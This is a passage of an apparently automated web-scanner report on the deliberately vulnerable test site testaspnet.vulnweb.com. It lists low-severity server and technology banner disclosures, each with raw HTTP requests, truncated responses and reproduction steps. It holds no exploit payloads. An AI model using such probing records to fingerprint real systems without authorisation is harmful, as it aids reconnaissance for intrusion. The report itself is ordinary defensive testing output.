    		<META http-equiv="Content-Type" content="text/html; charset=windows-1252">\x0d
    		<meta content="Microsoft Visual Studio .NET 7.1" name="GENERATOR">\x0d
    		<meta content="C#" name="CODE_LANGUAGE">\x0d
    		<meta content="JavaScript" name="vs_defaultClientScript">\x0d
    		<meta content="http://schemas.microsoft.com/intellisense/ie5" name="vs_targetSchema">\x0d
    		<LINK href="styles.css" type="text/css" rel="stylesheet">\x0d
    	</HEAD>\x0d
    ... [55 more lines, 4198 chars total]
  elapsed_ms: 514.7
  --- RAW REQUEST req-3a1f4ead (exactly as issued by the engine) ---
  POST /default.aspx
  headers:
    Content-Type: application/x-www-form-urlencoded
    Cookie: ASP.NET_SessionId=2u3xlta2bb2vnb55s1n1uu45
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    __EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE=%2FwEPDwUKLTEwNTI0MjkwNQ9kFgICAQ9kFgICAQ9kFgQCAQ8WBB4EaHJlZgUKbG9naW4uYXNweB4JaW5uZXJodG1sBQVsb2dpbmQCAw8WBB8AZB4HVmlzaWJsZWhkZArjxDMCoNA8%2F4bzlRmUHIna4LG5&__VIEWSTATEGENERATOR=CA0B0334&__EVENTVALIDATION=%2FwEWVwLpus%2FwCALi%2B%2BjXCAKUlvjlDgK20sH6DwK20sH6DwK20vWRBwK20vWRBwK20qn5BQK20qn5BQK20t2dDQK20t2dDQKL%2Ba8FAov5rwUCi%2FnD2QkCi%2FnD2QkCi%2Fn3%2FAICi%2Fn3%2FAICi%2FnrkwoCi%2FnrkwoCi%2FmftgMCi%2FmftgMCi%2FmzzQwCi%2FmzzQwCi%2Fmn4AUCi%2Fmn4AUCi%2FnbhA0Ci%2FnbhA0Ci%2FmP7AsCi%2FmP7AsCi%2FmjgwMCi%2FmjgwMCvJPvxAkCvJPvxAkCvJODmwECvJODmwECvJO3vgoCvJO3vgoCvJOr1QMCvJOr1QMCvJPf6QwCvJPf6QwCvJPzjAQCvJPzjAQCvJPnow0CvJPnow0CvJObxgYCvJObxgYCvJPPrwMCvJPPrwMCvJPjwgwCvJPjwgwCkbrN6w8CkbrN6w8CkbrhjgcCkbrhjgcCkbqVJQKRupUlApG6ifgJApG6ifgJApG6vZ8BApG6vZ8BApG60bMKApG60bMKApG6xdYDApG6xdYDApG6%2Be0MApG6%2Be0MApG6rdUJApG6rdUJApG6wekCApG6wekCAtTZwJ4HAtTZwJ4HAtTZ9DUC1Nn0NQLU2ejICQLU2ejICQLU2ZzvAgLU2ZzvAgLU2bCCCgLU2bCCCgLU2aTZAwLU2aTZAwLU2dj9DALU2dj9DALU2cyQBALU2cyQBOADTL8%2F1D30ovyktck2hrroq87L
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    cache-control: private
    content-length: 12502
    content-type: text/html; charset=utf-8
    date: Sat, 03 Oct 2026 01:23:36 GMT
    server: Microsoft-IIS/8.5
    x-aspnet-version: 2.0.50727
    x-powered-by: ASP.NET
  body:
    \x0d
    <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN" >\x0d
    <HTML>\x0d
    	<HEAD>\x0d
    		<title>acublog news</title>\x0d
    		<META http-equiv="Content-Type" content="text/html; charset=windows-1252">\x0d
    		<meta content="Microsoft Visual Studio .NET 7.1" name="GENERATOR">\x0d
    		<meta content="C#" name="CODE_LANGUAGE">\x0d
    		<meta content="JavaScript" name="vs_defaultClientScript">\x0d
    		<meta content="http://schemas.microsoft.com/intellisense/ie5" name="vs_targetSchema">\x0d
    		<LINK href="styles.css" type="text/css" rel="stylesheet">\x0d
    	</HEAD>\x0d
    ... [57 more lines, 4204 chars total]
  elapsed_ms: 509.8
- Evidence-OS reproduction recipe:
    1. authenticate a session with the application (as configured for the scan)
       expect: an authenticated session cookie/header
    2. send GET http://testaspnet.vulnweb.com/default.aspx as recorded
       expect: the same evidence kind fires as in the attached proof (header_value)

## [TESTASPNET F19] tech_banner_disclosure — low (engine verdict: verified)

- Surface: GET http://testaspnet.vulnweb.com/default.aspx (parameter: ``)
- Engine verdict: verified via `single-response-evidence` | confidence 0.7 | rounds 1
- Verification notes (engine-recorded): presence-based proof (weakest evidence class in the engine): established from ONE response — no replay oracle exists for this class by nature
- Impact (engine-assessed): indicated — Technology stack disclosed — reconnaissance aid.
- Evidence chain (engine-recorded):
    * [header_value] X-Powered-By: ASP.NET
    * [header_value] X-Powered-By: ASP.NET
- RAW reproduction (from the scan's request journal, verbatim):
  --- RAW REQUEST req-f4358432 (exactly as issued by the engine) ---
  GET /default.aspx
  headers:
    Cookie: ASP.NET_SessionId=2u3xlta2bb2vnb55s1n1uu45
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    cache-control: private
    content-length: 14045
    content-type: text/html; charset=utf-8
    date: Sat, 03 Oct 2026 01:22:58 GMT
    server: Microsoft-IIS/8.5
    x-aspnet-version: 2.0.50727
    x-powered-by: ASP.NET
  body:
    \x0d
    <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN" >\x0d
    <HTML>\x0d
    	<HEAD>\x0d
    		<title>acublog news</title>\x0d
    		<META http-equiv="Content-Type" content="text/html; charset=windows-1252">\x0d
    		<meta content="Microsoft Visual Studio .NET 7.1" name="GENERATOR">\x0d
    		<meta content="C#" name="CODE_LANGUAGE">\x0d
    		<meta content="JavaScript" name="vs_defaultClientScript">\x0d
    		<meta content="http://schemas.microsoft.com/intellisense/ie5" name="vs_targetSchema">\x0d
    		<LINK href="styles.css" type="text/css" rel="stylesheet">\x0d
    	</HEAD>\x0d
    ... [55 more lines, 4198 chars total]
  elapsed_ms: 514.7
  --- RAW REQUEST req-3a1f4ead (exactly as issued by the engine) ---
  POST /default.aspx
  headers:
    Content-Type: application/x-www-form-urlencoded
    Cookie: ASP.NET_SessionId=2u3xlta2bb2vnb55s1n1uu45
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    __EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE=%2FwEPDwUKLTEwNTI0MjkwNQ9kFgICAQ9kFgICAQ9kFgQCAQ8WBB4EaHJlZgUKbG9naW4uYXNweB4JaW5uZXJodG1sBQVsb2dpbmQCAw8WBB8AZB4HVmlzaWJsZWhkZArjxDMCoNA8%2F4bzlRmUHIna4LG5&__VIEWSTATEGENERATOR=CA0B0334&__EVENTVALIDATION=%2FwEWVwLpus%2FwCALi%2B%2BjXCAKUlvjlDgK20sH6DwK20sH6DwK20vWRBwK20vWRBwK20qn5BQK20qn5BQK20t2dDQK20t2dDQKL%2Ba8FAov5rwUCi%2FnD2QkCi%2FnD2QkCi%2Fn3%2FAICi%2Fn3%2FAICi%2FnrkwoCi%2FnrkwoCi%2FmftgMCi%2FmftgMCi%2FmzzQwCi%2FmzzQwCi%2Fmn4AUCi%2Fmn4AUCi%2FnbhA0Ci%2FnbhA0Ci%2FmP7AsCi%2FmP7AsCi%2FmjgwMCi%2FmjgwMCvJPvxAkCvJPvxAkCvJODmwECvJODmwECvJO3vgoCvJO3vgoCvJOr1QMCvJOr1QMCvJPf6QwCvJPf6QwCvJPzjAQCvJPzjAQCvJPnow0CvJPnow0CvJObxgYCvJObxgYCvJPPrwMCvJPPrwMCvJPjwgwCvJPjwgwCkbrN6w8CkbrN6w8CkbrhjgcCkbrhjgcCkbqVJQKRupUlApG6ifgJApG6ifgJApG6vZ8BApG6vZ8BApG60bMKApG60bMKApG6xdYDApG6xdYDApG6%2Be0MApG6%2Be0MApG6rdUJApG6rdUJApG6wekCApG6wekCAtTZwJ4HAtTZwJ4HAtTZ9DUC1Nn0NQLU2ejICQLU2ejICQLU2ZzvAgLU2ZzvAgLU2bCCCgLU2bCCCgLU2aTZAwLU2aTZAwLU2dj9DALU2dj9DALU2cyQBALU2cyQBOADTL8%2F1D30ovyktck2hrroq87L
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    cache-control: private
    content-length: 12502
    content-type: text/html; charset=utf-8
    date: Sat, 03 Oct 2026 01:23:36 GMT
    server: Microsoft-IIS/8.5
    x-aspnet-version: 2.0.50727
    x-powered-by: ASP.NET
  body:
    \x0d
    <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN" >\x0d
    <HTML>\x0d
    	<HEAD>\x0d
    		<title>acublog news</title>\x0d
    		<META http-equiv="Content-Type" content="text/html; charset=windows-1252">\x0d
    		<meta content="Microsoft Visual Studio .NET 7.1" name="GENERATOR">\x0d
    		<meta content="C#" name="CODE_LANGUAGE">\x0d
    		<meta content="JavaScript" name="vs_defaultClientScript">\x0d
    		<meta content="http://schemas.microsoft.com/intellisense/ie5" name="vs_targetSchema">\x0d
    		<LINK href="styles.css" type="text/css" rel="stylesheet">\x0d
    	</HEAD>\x0d
    ... [57 more lines, 4204 chars total]
  elapsed_ms: 509.8
- Evidence-OS reproduction recipe:
    1. authenticate a session with the application (as configured for the scan)
       expect: an authenticated session cookie/header
    2. send GET http://testaspnet.vulnweb.com/default.aspx as recorded
       expect: the same evidence kind fires as in the attached proof (header_value)

## [TESTASPNET F20] server_banner_disclosure — low (engine verdict: verified)

- Surface: GET http://testaspnet.vulnweb.com/login.aspx (parameter: ``)
- Engine verdict: verified via `single-response-evidence` | confidence 0.7 | rounds 1
- Verification notes (engine-recorded): presence-based proof (weakest evidence class in the engine): established from ONE response — no replay oracle exists for this class by nature
- Impact (engine-assessed): indicated — Server software version disclosed — reconnaissance aid.
- Evidence chain (engine-recorded):
    * [header_value] Server: Microsoft-IIS/8.5
    * [header_value] Server: Microsoft-IIS/8.5
- RAW reproduction (from the scan's request journal, verbatim):
  --- RAW REQUEST req-75887c18 (exactly as issued by the engine) ---
  GET /login.aspx
  headers:
    Cookie: ASP.NET_SessionId=2u3xlta2bb2vnb55s1n1uu45
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    cache-control: private
    content-length: 13400
    content-type: text/html; charset=utf-8
    date: Sat, 03 Oct 2026 01:23:00 GMT
    server: Microsoft-IIS/8.5
    x-aspnet-version: 2.0.50727
    x-powered-by: ASP.NET
  body:
    \x0d
    <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN" >\x0d
    <HTML>\x0d
    	<HEAD>\x0d
    		<title>login</title>\x0d
    		<meta name="vs_showGrid" content="True">\x0d
    		<meta name="GENERATOR" Content="Microsoft Visual Studio .NET 7.1">\x0d
    		<meta name="CODE_LANGUAGE" Content="C#">\x0d
    		<meta name="vs_defaultClientScript" content="JavaScript">\x0d
    		<meta name="vs_targetSchema" content="http://schemas.microsoft.com/intellisense/ie5">\x0d
    		<LINK href="styles.css" type="text/css" rel="stylesheet">\x0d
    	</HEAD>\x0d
    ... [54 more lines, 4195 chars total]
  elapsed_ms: 493.4
  --- RAW REQUEST req-3accfee0 (exactly as issued by the engine) ---
  POST /login.aspx
  headers:
    Content-Type: application/x-www-form-urlencoded
    Cookie: ASP.NET_SessionId=2u3xlta2bb2vnb55s1n1uu45
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    __EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE=%2FwEPDwUKLTIyMzk2OTgxMQ9kFgICAQ9kFgICAQ9kFgQCAQ8WBB4EaHJlZgUKbG9naW4uYXNweB4JaW5uZXJodG1sBQVsb2dpbmQCAw8WBB8AZB4HVmlzaWJsZWhkGAEFHl9fQ29udHJvbHNSZXF1aXJlUG9zdEJhY2tLZXlfXxYBBQ9jYlBlcnNpc3RDb29raWVzwbv%2BQ8XadeewSqHhJbH9z4dvJw%3D%3D&__VIEWSTATEGENERATOR=C2EE9ABB&__EVENTVALIDATION=%2FwEWWwLoz%2FfGCgLStq24BwK3jsrkBALtuvfLDQKC3IeGDALi%2B%2BjXCAKUlvjlDgK20sH6DwK20sH6DwK20vWRBwK20vWRBwK20qn5BQK20qn5BQK20t2dDQK20t2dDQKL%2Ba8FAov5rwUCi%2FnD2QkCi%2FnD2QkCi%2Fn3%2FAICi%2Fn3%2FAICi%2FnrkwoCi%2FnrkwoCi%2FmftgMCi%2FmftgMCi%2FmzzQwCi%2FmzzQwCi%2Fmn4AUCi%2Fmn4AUCi%2FnbhA0Ci%2FnbhA0Ci%2FmP7AsCi%2FmP7AsCi%2FmjgwMCi%2FmjgwMCvJPvxAkCvJPvxAkCvJODmwECvJODmwECvJO3vgoCvJO3vgoCvJOr1QMCvJOr1QMCvJPf6QwCvJPf6QwCvJPzjAQCvJPzjAQCvJPnow0CvJPnow0CvJObxgYCvJObxgYCvJPPrwMCvJPPrwMCvJPjwgwCvJPjwgwCkbrN6w8CkbrN6w8CkbrhjgcCkbrhjgcCkbqVJQKRupUlApG6ifgJApG6ifgJApG6vZ8BApG6vZ8BApG60bMKApG60bMKApG6xdYDApG6xdYDApG6%2Be0MApG6%2Be0MApG6rdUJApG6rdUJApG6wekCApG6wekCAtTZwJ4HAtTZwJ4HAtTZ9DUC1Nn0NQLU2ejICQLU2ejICQLU2ZzvAgLU2ZzvAgLU2bCCCgLU2bCCCgLU2aTZAwLU2aTZAwLU2dj9DALU2dj9DALU2cyQBALU2cyQBBA5zuroos8GeQOELGaDp6VnaRLG&tbUsername=&tbPassword=&cbPersistCookie=
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    cache-control: private
    content-length: 13382
    content-type: text/html; charset=utf-8
    date: Sat, 03 Oct 2026 01:25:24 GMT
    server: Microsoft-IIS/8.5
    x-aspnet-version: 2.0.50727
    x-powered-by: ASP.NET
  body:
    \x0d
    <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN" >\x0d
    <HTML>\x0d
    	<HEAD>\x0d
    		<title>login</title>\x0d
    		<meta name="vs_showGrid" content="True">\x0d
    		<meta name="GENERATOR" Content="Microsoft Visual Studio .NET 7.1">\x0d
    		<meta name="CODE_LANGUAGE" Content="C#">\x0d
    		<meta name="vs_defaultClientScript" content="JavaScript">\x0d
    		<meta name="vs_targetSchema" content="http://schemas.microsoft.com/intellisense/ie5">\x0d
    		<LINK href="styles.css" type="text/css" rel="stylesheet">\x0d
    	</HEAD>\x0d
    ... [54 more lines, 4195 chars total]
  elapsed_ms: 479.0
- Evidence-OS reproduction recipe:
    1. authenticate a session with the application (as configured for the scan)
       expect: an authenticated session cookie/header
    2. send GET http://testaspnet.vulnweb.com/login.aspx as recorded
       expect: the same evidence kind fires as in the attached proof (header_value)

## [TESTASPNET F21] tech_banner_disclosure — low (engine verdict: verified)

- Surface: GET http://testaspnet.vulnweb.com/login.aspx (parameter: ``)
- Engine verdict: verified via `single-response-evidence` | confidence 0.7 | rounds 1
- Verification notes (engine-recorded): presence-based proof (weakest evidence class in the engine): established from ONE response — no replay oracle exists for this class by nature
- Impact (engine-assessed): indicated — Technology stack disclosed — reconnaissance aid.
- Evidence chain (engine-recorded):
    * [header_value] X-Powered-By: ASP.NET
    * [header_value] X-Powered-By: ASP.NET
- RAW reproduction (from the scan's request journal, verbatim):
  --- RAW REQUEST req-75887c18 (exactly as issued by the engine) ---
  GET /login.aspx
  headers:
    Cookie: ASP.NET_SessionId=2u3xlta2bb2vnb55s1n1uu45
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    cache-control: private
    content-length: 13400
    content-type: text/html; charset=utf-8
    date: Sat, 03 Oct 2026 01:23:00 GMT
    server: Microsoft-IIS/8.5
    x-aspnet-version: 2.0.50727
    x-powered-by: ASP.NET
  body:
    \x0d
    <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN" >\x0d
    <HTML>\x0d
    	<HEAD>\x0d
    		<title>login</title>\x0d
    		<meta name="vs_showGrid" content="True">\x0d
    		<meta name="GENERATOR" Content="Microsoft Visual Studio .NET 7.1">\x0d
    		<meta name="CODE_LANGUAGE" Content="C#">\x0d
    		<meta name="vs_defaultClientScript" content="JavaScript">\x0d
    		<meta name="vs_targetSchema" content="http://schemas.microsoft.com/intellisense/ie5">\x0d
    		<LINK href="styles.css" type="text/css" rel="stylesheet">\x0d
    	</HEAD>\x0d
    ... [54 more lines, 4195 chars total]
  elapsed_ms: 493.4
  --- RAW REQUEST req-3accfee0 (exactly as issued by the engine) ---
  POST /login.aspx
  headers:
    Content-Type: application/x-www-form-urlencoded
    Cookie: ASP.NET_SessionId=2u3xlta2bb2vnb55s1n1uu45
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    __EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE=%2FwEPDwUKLTIyMzk2OTgxMQ9kFgICAQ9kFgICAQ9kFgQCAQ8WBB4EaHJlZgUKbG9naW4uYXNweB4JaW5uZXJodG1sBQVsb2dpbmQCAw8WBB8AZB4HVmlzaWJsZWhkGAEFHl9fQ29udHJvbHNSZXF1aXJlUG9zdEJhY2tLZXlfXxYBBQ9jYlBlcnNpc3RDb29raWVzwbv%2BQ8XadeewSqHhJbH9z4dvJw%3D%3D&__VIEWSTATEGENERATOR=C2EE9ABB&__EVENTVALIDATION=%2FwEWWwLoz%2FfGCgLStq24BwK3jsrkBALtuvfLDQKC3IeGDALi%2B%2BjXCAKUlvjlDgK20sH6DwK20sH6DwK20vWRBwK20vWRBwK20qn5BQK20qn5BQK20t2dDQK20t2dDQKL%2Ba8FAov5rwUCi%2FnD2QkCi%2FnD2QkCi%2Fn3%2FAICi%2Fn3%2FAICi%2FnrkwoCi%2FnrkwoCi%2FmftgMCi%2FmftgMCi%2FmzzQwCi%2FmzzQwCi%2Fmn4AUCi%2Fmn4AUCi%2FnbhA0Ci%2FnbhA0Ci%2FmP7AsCi%2FmP7AsCi%2FmjgwMCi%2FmjgwMCvJPvxAkCvJPvxAkCvJODmwECvJODmwECvJO3vgoCvJO3vgoCvJOr1QMCvJOr1QMCvJPf6QwCvJPf6QwCvJPzjAQCvJPzjAQCvJPnow0CvJPnow0CvJObxgYCvJObxgYCvJPPrwMCvJPPrwMCvJPjwgwCvJPjwgwCkbrN6w8CkbrN6w8CkbrhjgcCkbrhjgcCkbqVJQKRupUlApG6ifgJApG6ifgJApG6vZ8BApG6vZ8BApG60bMKApG60bMKApG6xdYDApG6xdYDApG6%2Be0MApG6%2Be0MApG6rdUJApG6rdUJApG6wekCApG6wekCAtTZwJ4HAtTZwJ4HAtTZ9DUC1Nn0NQLU2ejICQLU2ejICQLU2ZzvAgLU2ZzvAgLU2bCCCgLU2bCCCgLU2aTZAwLU2aTZAwLU2dj9DALU2dj9DALU2cyQBALU2cyQBBA5zuroos8GeQOELGaDp6VnaRLG&tbUsername=&tbPassword=&cbPersistCookie=
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    cache-control: private
    content-length: 13382
    content-type: text/html; charset=utf-8
    date: Sat, 03 Oct 2026 01:25:24 GMT
    server: Microsoft-IIS/8.5
    x-aspnet-version: 2.0.50727
    x-powered-by: ASP.NET
  body:
    \x0d
    <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN" >\x0d
    <HTML>\x0d
    	<HEAD>\x0d
    		<title>login</title>\x0d
    		<meta name="vs_showGrid" content="True">\x0d
    		<meta name="GENERATOR" Content="Microsoft Visual Studio .NET 7.1">\x0d
    		<meta name="CODE_LANGUAGE" Content="C#">\x0d
    		<meta name="vs_defaultClientScript" content="JavaScript">\x0d
    		<meta name="vs_targetSchema" content="http://schemas.microsoft.com/intellisense/ie5">\x0d
    		<LINK href="styles.css" type="text/css" rel="stylesheet">\x0d
    	</HEAD>\x0d
    ... [54 more lines, 4195 chars total]
  elapsed_ms: 479.0
- Evidence-OS reproduction recipe:
    1. authenticate a session with the application (as configured for the scan)
       expect: an authenticated session cookie/header
    2. send GET http://testaspnet.vulnweb.com/login.aspx as recorded
       expect: the same evidence kind fires as in the attached proof (header_value)

## [TESTASPNET F22] server_banner_disclosure — low (engine verdict: verified)

- Surface: GET http://testaspnet.vulnweb.com/Signup.aspx (parameter: ``)
- Engine verdict: verified via `single-response-evidence` | confidence 0.7 | rounds 1
- Verification notes (engine-recorded): presence-based proof (weakest evidence class in the engine): established from ONE response — no replay oracle exists for this class by nature
- Impact (engine-assessed): indicated — Server software version disclosed — reconnaissance aid.
- Evidence chain (engine-recorded):
    * [header_value] Server: Microsoft-IIS/8.5
    * [header_value] Server: Microsoft-IIS/8.5
- RAW reproduction (from the scan's request journal, verbatim):
  --- RAW REQUEST req-34addc4d (exactly as issued by the engine) ---
  GET /Signup.aspx
  headers:
    Cookie: ASP.NET_SessionId=2u3xlta2bb2vnb55s1n1uu45
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    cache-control: private
    content-length: 13085
    content-type: text/html; charset=utf-8
    date: Sat, 03 Oct 2026 01:23:02 GMT
    server: Microsoft-IIS/8.5
    x-aspnet-version: 2.0.50727
    x-powered-by: ASP.NET
  body:
    \x0d
    <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN" >\x0d
    <HTML>\x0d
    	<HEAD>\x0d
    		<title>Signup</title>\x0d
    		<meta name="GENERATOR" Content="Microsoft Visual Studio .NET 7.1">\x0d
    		<meta name="CODE_LANGUAGE" Content="C#">\x0d
    		<meta name="vs_defaultClientScript" content="JavaScript">\x0d
    		<meta name="vs_targetSchema" content="http://schemas.microsoft.com/intellisense/ie5">\x0d
    		<LINK href="styles.css" type="text/css" rel="stylesheet">\x0d
    	</HEAD>\x0d
    	<body>\x0d
    ... [54 more lines, 4195 chars total]
  elapsed_ms: 532.0
  --- RAW REQUEST req-9272de1b (exactly as issued by the engine) ---
  POST /Signup.aspx
  headers:
    Content-Type: application/x-www-form-urlencoded
    Cookie: ASP.NET_SessionId=2u3xlta2bb2vnb55s1n1uu45
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    __EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE=%2FwEPDwUKLTY0MzI4NjU4Mw9kFgICAQ9kFgICAQ9kFgQCAQ8WBB4EaHJlZgUKbG9naW4uYXNweB4JaW5uZXJodG1sBQVsb2dpbmQCAw8WBB8AZB4HVmlzaWJsZWhkZLWF2wpV006tz0eDdoKfDbx%2Bi81I&__VIEWSTATEGENERATOR=36F90C25&__EVENTVALIDATION=%2FwEWWgK42oW1DwLStq24BwK3jsrkBALF97vxAQLi%2B%2BjXCAKUlvjlDgK20sH6DwK20sH6DwK20vWRBwK20vWRBwK20qn5BQK20qn5BQK20t2dDQK20t2dDQKL%2Ba8FAov5rwUCi%2FnD2QkCi%2FnD2QkCi%2Fn3%2FAICi%2Fn3%2FAICi%2FnrkwoCi%2FnrkwoCi%2FmftgMCi%2FmftgMCi%2FmzzQwCi%2FmzzQwCi%2Fmn4AUCi%2Fmn4AUCi%2FnbhA0Ci%2FnbhA0Ci%2FmP7AsCi%2FmP7AsCi%2FmjgwMCi%2FmjgwMCvJPvxAkCvJPvxAkCvJODmwECvJODmwECvJO3vgoCvJO3vgoCvJOr1QMCvJOr1QMCvJPf6QwCvJPf6QwCvJPzjAQCvJPzjAQCvJPnow0CvJPnow0CvJObxgYCvJObxgYCvJPPrwMCvJPPrwMCvJPjwgwCvJPjwgwCkbrN6w8CkbrN6w8CkbrhjgcCkbrhjgcCkbqVJQKRupUlApG6ifgJApG6ifgJApG6vZ8BApG6vZ8BApG60bMKApG60bMKApG6xdYDApG6xdYDApG6%2Be0MApG6%2Be0MApG6rdUJApG6rdUJApG6wekCApG6wekCAtTZwJ4HAtTZwJ4HAtTZ9DUC1Nn0NQLU2ejICQLU2ejICQLU2ZzvAgLU2ZzvAgLU2bCCCgLU2bCCCgLU2aTZAwLU2aTZAwLU2dj9DALU2dj9DALU2cyQBALU2cyQBAjHNjOJsOhDVpmIl0cP5avjE8wS&tbUsername=&tbPassword=
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    cache-control: private
    content-length: 13085
    content-type: text/html; charset=utf-8
    date: Sat, 03 Oct 2026 01:26:37 GMT
    server: Microsoft-IIS/8.5
    x-aspnet-version: 2.0.50727
    x-powered-by: ASP.NET
  body:
    \x0d
    <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN" >\x0d
    <HTML>\x0d
    	<HEAD>\x0d
    		<title>Signup</title>\x0d
    		<meta name="GENERATOR" Content="Microsoft Visual Studio .NET 7.1">\x0d
    		<meta name="CODE_LANGUAGE" Content="C#">\x0d
    		<meta name="vs_defaultClientScript" content="JavaScript">\x0d
    		<meta name="vs_targetSchema" content="http://schemas.microsoft.com/intellisense/ie5">\x0d
    		<LINK href="styles.css" type="text/css" rel="stylesheet">\x0d
    	</HEAD>\x0d
    	<body>\x0d
    ... [54 more lines, 4195 chars total]
  elapsed_ms: 508.9
- Evidence-OS reproduction recipe:
    1. authenticate a session with the application (as configured for the scan)
       expect: an authenticated session cookie/header
    2. send GET http://testaspnet.vulnweb.com/Signup.aspx as recorded
       expect: the same evidence kind fires as in the attached proof (header_value)

## [TESTASPNET F23] tech_banner_disclosure — low (engine verdict: verified)

- Surface: GET http://testaspnet.vulnweb.com/Signup.aspx (parameter: ``)
- Engine verdict: verified via `single-response-evidence` | confidence 0.7 | rounds 1
- Verification notes (engine-recorded): presence-based proof (weakest evidence class in the engine): established from ONE response — no replay oracle exists for this class by nature
- Impact (engine-assessed): indicated — Technology stack disclosed — reconnaissance aid.
- Evidence chain (engine-recorded):
    * [header_value] X-Powered-By: ASP.NET
    * [header_value] X-Powered-By: ASP.NET
- RAW reproduction (from the scan's request journal, verbatim):
  --- RAW REQUEST req-34addc4d (exactly as issued by the engine) ---
  GET /Signup.aspx
  headers:
    Cookie: ASP.NET_SessionId=2u3xlta2bb2vnb55s1n1uu45
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    (empty)
  --- RAW RESPONSE (final, after redirect hops) ---
  HTTP 200
  headers:
    cache-control: private
    content-length: 13085
    content-type: text/html; charset=utf-8
    date: Sat, 03 Oct 2026 01:23:02 GMT
    server: Microsoft-IIS/8.5
    x-aspnet-version: 2.0.50727
    x-powered-by: ASP.NET
  body:
    \x0d
    <!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.0 Transitional//EN" >\x0d
    <HTML>\x0d
    	<HEAD>\x0d
    		<title>Signup</title>\x0d
    		<meta name="GENERATOR" Content="Microsoft Visual Studio .NET 7.1">\x0d
    		<meta name="CODE_LANGUAGE" Content="C#">\x0d
    		<meta name="vs_defaultClientScript" content="JavaScript">\x0d
    		<meta name="vs_targetSchema" content="http://schemas.microsoft.com/intellisense/ie5">\x0d
    		<LINK href="styles.css" type="text/css" rel="stylesheet">\x0d
    	</HEAD>\x0d
    	<body>\x0d
    ... [54 more lines, 4195 chars total]
  elapsed_ms: 532.0
  --- RAW REQUEST req-9272de1b (exactly as issued by the engine) ---
  POST /Signup.aspx
  headers:
    Content-Type: application/x-www-form-urlencoded
    Cookie: ASP.NET_SessionId=2u3xlta2bb2vnb55s1n1uu45
    User-Agent: Mozilla/5.0 (compatible; Sentinel/4.2.1; +security-scanner)
  body:
    __EVENTTARGET=&__EVENTARGUMENT=&__VIEWSTATE=%2FwEPDwUKLTY0MzI4NjU4Mw9kFgICAQ9kFgICAQ9kFgQCAQ8WBB4EaHJlZgUKbG9naW4uYXNweB4JaW5uZXJodG1sBQVsb2dpbmQCAw8WBB8AZB4HVmlzaWJsZWhkZLWF2wpV006tz0eDdoKfDbx%2Bi81I&__VIEWSTATEGENERATOR=36F90C25&__EVENTVALIDATION=%2FwEWWgK42oW1DwLStq24BwK3jsrkBALF97vxAQLi%2B%2BjXCAKUlvjlDgK20sH6DwK20sH6DwK20vWRBwK20vWRBwK20qn5BQK20qn5BQK20t2dDQK20t2dDQKL%2Ba8FAov5rwUCi%2FnD2QkCi%2FnD2QkCi%2Fn3%2FAICi%2Fn3%2FAICi%2FnrkwoCi%2FnrkwoCi%2FmftgMCi%2FmftgMCi%2FmzzQwCi%2FmzzQwCi%2Fmn4AUCi%2Fmn4AUCi%2FnbhA0Ci%2FnbhA0Ci%2FmP7AsCi%2FmP7AsCi%2FmjgwMCi%2FmjgwMCvJPvxAkCvJPvxAkCvJODmwECvJODmwECvJO3vgoCvJO3vgoCvJOr1QMCvJOr1QMCvJPf6QwCvJPf6QwCvJPzjAQCvJPzjAQCvJPnow0CvJPnow0CvJObxgYCvJObxgYCvJPPrwMCvJPPrwMCvJPjwgwCvJPjwgwCkbrN6w8CkbrN6w8CkbrhjgcCkbrhjgcCkbqVJQKRupUlApG6ifgJApG6ifgJApG6vZ8BApG6vZ8BApG60bMKApG60bMKApG6xdYDApG6xdYDApG6%2Be0MApG6%2Be0MApG6rdUJApG6rdUJApG6wekCApG6wekCAtTZwJ4HAtTZwJ4HAtTZ9DUC1Nn0NQLU2ejICQLU2ejICQLU2ZzvAgLU2ZzvAgLU2bCCCgLU2bCCCgLU2aTZAwLU2aTZAwLU2dj9DALU2dj9DALU2cyQBALU2cyQBAjHNjOJsOhDVpmIl0cP5avjE8wS&tbUsername=&tbPassword=
